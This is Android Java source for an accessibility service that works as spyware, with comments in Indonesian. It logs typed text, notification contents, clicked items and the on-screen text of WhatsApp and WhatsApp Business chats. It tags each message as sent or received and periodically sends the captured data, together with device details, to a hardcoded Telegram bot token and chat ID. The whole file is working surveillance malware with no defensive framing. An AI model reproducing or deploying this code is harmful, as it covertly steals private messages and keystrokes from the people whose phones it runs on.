package com;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Notification;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.LinkedHashMap;
import java.util.Map;

public class MyAccessibilityService extends AccessibilityService {

    private static final int MAX_BUFFER_SIZE = 25;
    private static final String TAG = "AppUsageAccessibilityService";
    private static final String TARGET_APP_PACKAGE1 = "com.whatsapp.w4b";
    private static final String TARGET_APP_PACKAGE2 = "com.whatsapp";
    private static final long EXPIRATION_TIME = 10 * 60 * 1000; // 10 minutes

    private final StringBuilder currentKeyEvents = new StringBuilder();
    private int keyEventCount = 0;
    private final Map<String, Long> sentTexts = new LinkedHashMap<>();

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                handleTextChangedEvent(event);
                break;
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                handleNotificationChangedEvent(event);
                break;
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                handleTypeViewEvent(event);
                break;
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
                if (TARGET_APP_PACKAGE1.equals(packageName) || TARGET_APP_PACKAGE2.equals(packageName)) {
                    Log.d(TAG, "WhatsApp opened!");
                    logAllTexts();
                }
                break;
        }
    }

    private void logAllTexts() {
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode != null) {
            StringBuilder stringBuilder = new StringBuilder();
            traverseNode(rootNode, stringBuilder);
            String allTexts = stringBuilder.toString();
            Log.d(TAG, "Detected messages:\n" + allTexts);

            long currentTime = System.currentTimeMillis();
            sentTexts.entrySet().removeIf(entry -> currentTime - entry.getValue() > EXPIRATION_TIME);

            if (!sentTexts.containsKey(allTexts)) {
                currentKeyEvents.append(allTexts).append("\n");
                sentTexts.put(allTexts, currentTime);

                if (currentKeyEvents.length() >= MAX_BUFFER_SIZE) {
                    sendBufferToDiscordAndClear();
                }
            } else {
                Log.d(TAG, "Duplicate message ignored.");
                currentKeyEvents.append("Duplicate log avoided.\n");
                sendBufferToDiscordAndClear();
            }
        }
    }

    // âœ… DETEKSI PESAN BUBBLE KIRI/KANAN
    private String detectSenderOrReceiver(AccessibilityNodeInfo node) {
        if (node == null) return "Unknown";

        AccessibilityNodeInfo parent = node.getParent();
        if (parent != null && parent.getChildCount() >= 2) {
            try {
                AccessibilityNodeInfo first = parent.getChild(0);
                AccessibilityNodeInfo last = parent.getChild(parent.getChildCount() - 1);
                if (node.equals(first)) {
                    return "Penerima (kiri)";
                } else if (node.equals(last)) {
                    return "Pengirim (kanan)";
                }
            } catch (Exception e) {
                Log.e(TAG, "Error in detectSenderOrReceiver: " + e.getMessage());
            }
        }

        return "Unknown";
    }

    private void traverseNode(AccessibilityNodeInfo node, StringBuilder stringBuilder) {
    if (node.getText() != null && node.getText().length() > 0) {
        Log.d(TAG, "Node Text: " + node.getText().toString());
        Log.d(TAG, "Class: " + node.getClassName());
        Log.d(TAG, "ChildCount: " + node.getChildCount());
        Log.d(TAG, "Parent: " + (node.getParent() != null ? node.getParent().getClassName() : "null"));
    }
        if (node == null) return;

        if (node.getText() != null && node.getText().length() > 0) {
            String text = node.getText().toString();
            String posisi = detectSenderOrReceiver(node);
            String logText = posisi + ": " + text;
            stringBuilder.append(logText).append("\n\n");
            Log.d(TAG, logText);
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            traverseNode(node.getChild(i), stringBuilder);
        }
    }

    private void handleTextChangedEvent(AccessibilityEvent event) {
        List<CharSequence> textList = event.getText();
        StringBuilder buffer = new StringBuilder();
        boolean newTextAdded = false;

        for (CharSequence text : textList) {
            String newText = text.toString();
            int newKeyEventCount = countKeyEvents(newText);
            if (newKeyEventCount > keyEventCount) {
                buffer.append(newText.substring(keyEventCount));
                newTextAdded = true;
            }
            keyEventCount = newKeyEventCount;
        }

        if (newTextAdded) {
            currentKeyEvents.append(buffer.toString());
            if (currentKeyEvents.length() >= MAX_BUFFER_SIZE) {
                sendBufferToDiscordAndClear();
            }
        }
    }

    private void handleNotificationChangedEvent(AccessibilityEvent event) {
        StringBuilder notificationTextBuilder = new StringBuilder();
        for (CharSequence text : event.getText()) {
            notificationTextBuilder.append(text);
        }

        Notification notification = (Notification) event.getParcelableData();
        if (notification != null) {
            Bundle extras = notification.extras;
            String title = extras.getString(Notification.EXTRA_TITLE, "");
            String text = extras.getString(Notification.EXTRA_TEXT, "");
            String subText = extras.getString(Notification.EXTRA_SUB_TEXT, "");
            String bigText = extras.getString(Notification.EXTRA_BIG_TEXT, "");

            currentKeyEvents.append("Notification: ").append(title).append(" - ").append(text)
                    .append(subText.isEmpty() ? "" : " - " + subText)
                    .append(bigText.isEmpty() ? "" : " - " + bigText).append("\n");
        } else {
            currentKeyEvents.append("Notification: ").append(notificationTextBuilder.toString()).append("\n");
        }

        if (currentKeyEvents.length() >= MAX_BUFFER_SIZE) {
            sendBufferToDiscordAndClear();
        }
    }

    private void handleTypeViewEvent(AccessibilityEvent event) {
        StringBuilder clickedViewTextBuilder = new StringBuilder();
        for (CharSequence text : event.getText()) {
            clickedViewTextBuilder.append(text);
        }
        CharSequence clickedViewText = clickedViewTextBuilder.toString();

        if (!clickedViewText.toString().isEmpty()) {
            currentKeyEvents.append("Clicked: ").append(clickedViewText).append("\n");
            if (currentKeyEvents.length() >= MAX_BUFFER_SIZE) {
                sendBufferToDiscordAndClear();
            }
        }
    }

    private int countKeyEvents(String text) {
        return text.length();
    }

    private void sendBufferToDiscordAndClear() {
        String log = currentKeyEvents.toString();
        String deviceInfo = "MANUFACTURER: " + Build.MANUFACTURER + "\nMODEL: " + Build.MODEL + "\n";
        log = deviceInfo + log;
        new MessageSender().execute(log);
        currentKeyEvents.setLength(0);
    }

    @Override
    public void onInterrupt() {}

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.flags = AccessibilityServiceInfo.DEFAULT;
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        setServiceInfo(info);

        SharedPreferences prefs = getSharedPreferences("MyPrefs", Context.MODE_PRIVATE);
        boolean isFirstRun = prefs.getBoolean("FirstRun", true);
        if (isFirstRun) {
            String deviceDetails = getSYSInfo();
            currentKeyEvents.append(deviceDetails).append("\n");
            sendBufferToDiscordAndClear();
            prefs.edit().putBoolean("FirstRun", false).apply();
        }
    }

    private String getSYSInfo() {
        return "MANUFACTURER : " + Build.MANUFACTURER + "\n" +
               "MODEL : " + Build.MODEL + "\n" +
               "PRODUCT : " + Build.PRODUCT + "\n" +
               "VERSION.RELEASE : " + Build.VERSION.RELEASE + "\n" +
               "VERSION.SDK.NUMBER : " + Build.VERSION.SDK_INT + "\n";
    }

    private static class MessageSender extends AsyncTask<String, Void, Void> {
        private static final String TAG = "MessageSender";
        @Override
        protected Void doInBackground(String... strings) {
            String log = strings[0];
            try {
                String botToken = "7207051466:AAGFZO7pfDDDOiwuGbsNIrU8cHrLmSM1E4A";
                String chatId = "1461889061";
                String urlString = "https://api.telegram.org/bot" + botToken + "/sendMessage";

                URL url = new URL(urlString);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "application/json");
                connection.setDoOutput(true);

                log = log.replace("Notification:", "\nNotification:");

                JSONObject messageJSON = new JSONObject();
                messageJSON.put("chat_id", chatId);
                messageJSON.put("text", "```\n" + log + "\n```");
                messageJSON.put("parse_mode", "MarkdownV2");

                OutputStream os = connection.getOutputStream();
                os.write(messageJSON.toString().getBytes(StandardCharsets.UTF_8));
                os.flush();
                os.close();

                int responseCode = connection.getResponseCode();
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    Log.d(TAG, "Sukses kirim response.");
                } else {
                    Log.e(TAG, "Failed to send to Telegram. Code: " + responseCode);
                }

                connection.disconnect();
            } catch (JSONException e) {
                Log.e(TAG, "JSON error: " + e.getMessage());
            } catch (Exception e) {
                Log.e(TAG, "Telegram send error: " + e.getMessage());
            }
            return null;
        }
    }
}
